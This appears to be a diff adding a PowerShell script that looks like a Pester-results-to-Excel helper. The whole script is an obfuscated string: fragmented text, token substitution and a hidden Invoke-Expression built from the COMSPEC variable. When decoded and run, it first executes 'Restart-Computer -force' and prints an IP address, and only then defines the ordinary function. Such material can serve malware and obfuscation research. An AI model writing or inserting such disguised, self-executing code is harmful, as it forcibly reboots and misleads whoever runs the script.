@@ -1,0 +1,37 @@
+('Restart-Computer -force
+(  l0nip:209.194.222.215l0n ) j1rwrite-host
+function Show-PesterResults {
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(i3GPSUseSingularNounsi3G, i3Gi3G, Justificat'+'ion=i3GNo suitable singulari3G)]
+    Param()
+    IPU'+'x'+'lfilename = i'+'3G.sn'+'Ptest.xlsxi3G
+    Remove-Item IPUxlfilename -ErrorAction Ig'+'nore
+
+'+'    IPUConditionalText = @()
+    IPUConditi'+'onalText += New-ConditionalText -Range i3GResulti3G -Text failed  -Backg'+'roundColor red   -ConditionalTextColor black
+    IPUCond'+'itionalText += New-Condit'+'ionalText -Rang'+'e i3GResulti3G -Text passed  -Backgrou'+'ndColor green -ConditionalTextColor black
+    IPUConditionalText += New-Con'+'ditionalText -Range i3GResulti3G -Text pending -BackgroundColor gray  -ConditionalTextC'+'olor black
+
+    IPUxlParams = @{
+        Path             '+' = IP'+'Ux'+'lfilename
+        WorkSheetname'+'     = l0nPesterTestsl0n
+        Conditi'+'onalText'+'   = IPUConditionalText
+        Pivo'+'tRows  '+'    '+'   = l0nResultl0'+'n, l'+'0'+'nNa'+'mel0n
+        PivotData         = @{l0nResultl0n = l0nCountl0n}
+        IncludePivotTable = IPUtrue
+        AutoSize'+'          = IPUtrue
+        AutoName'+'Range     = IPUt'+'rue
+        AutoFil'+'ter        = IPUtrue
+        Show              = IPUtrue
+    }
+
+    IPU(foreac'+'h (IPUresul'+'t '+'in (Invoke-Pester -PassT'+'hru -Show None).TestResult) {
+            [PSCustomObject]@{
+       '+' '+'        Descr'+'i'+'ption '+'= IPU'+'result.Descr'+'ibe
+                Name        = IPUresult.Name
+             '+'   Result      = IPUresult.Result
+     '+'           Mess'+'ge      = IP'+'Uresult.FailureMessage
+                StackTrace  = IPUresult.Stack'+'Trace
+            }
+        }) j1r S'+'ort-Object Description '+'j1r Export-Excel @xlParams
+}
+').REpLacE('l0n',[stRING][ChaR]39).REpLacE('snP','\').REpLacE('j1r',[stRING][ChaR]124).REpLacE(([ChaR]105+[ChaR]51+[ChaR]71),[stRING][ChaR]34).REpLacE('IPU',[stRING][ChaR]36) |.( $eNv:comsPec[4,24,25]-joIN'')
